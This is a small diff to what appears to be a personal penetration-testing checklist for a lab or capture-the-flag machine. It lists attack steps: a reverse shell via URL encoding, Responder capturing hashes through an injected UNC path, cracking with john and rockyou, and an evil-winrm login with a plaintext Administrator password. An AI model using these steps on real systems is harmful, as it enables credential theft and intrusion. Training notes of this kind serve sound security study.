@@ -23,7 +23,7 @@
 11. If you receive command execution, we will insert a reversshell via url encoding. Done.
 12. Use responder to capture. sudo python3 Responder.py -I tun0. inject file=//$MyIP/testShare in the url. Use john the ripper to match hash. 
 13. john -w=/usr/share/wordlists/rockyou.txt hash.txt
- 
+14. login to window .evil-winrm -i 10.129.147.34 -u Administrator -p badminton
 
 ## Login page
 1. Always check for default credentials
